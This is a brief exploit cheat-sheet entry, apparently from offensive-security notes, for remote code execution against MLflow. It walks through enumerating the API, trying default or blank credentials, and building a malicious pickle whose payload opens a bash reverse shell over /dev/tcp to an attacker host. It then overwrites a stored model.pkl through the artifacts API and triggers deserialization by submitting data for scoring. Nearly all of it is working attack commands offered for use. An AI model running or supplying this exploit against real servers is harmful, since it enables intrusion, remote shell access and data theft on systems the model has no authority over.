# MLflow PyFunc Pickle Deserialization RCE

MLflow loads Python function models (`pyfunc`) using pickle via the artifacts API. Overwrite an existing model's pickle file with a malicious one; when the app scores data, it deserializes and executes the payload.

```bash
# Enumerate MLflow (default port 5000):
curl http://<TARGET>:5000/api/2.0/mlflow/experiments/list
# If behind HTTP basic auth, try example creds from MLflow docs: no username, no password (blank)
# Or: admin/admin, user/password

# 1. List runs to find the artifact URI:
curl http://<TARGET>:5000/api/2.0/mlflow/runs/search \
  -H 'Content-Type: application/json' -d '{}'

# 2. Create malicious pickle payload:
python3 -c "
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return os.system, ('bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"',)
import pickle
with open('model.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
"

# 3. Upload via MLflow artifacts API, overwriting the model.pkl:
curl -X POST "http://<TARGET>:5000/api/2.0/mlflow-artifacts/artifacts/<experiment_id>/<run_id>/artifacts/model/model.pkl" \
  --data-binary @model.pkl

# 4. Trigger scoring — submit a file for processing via the web app
```
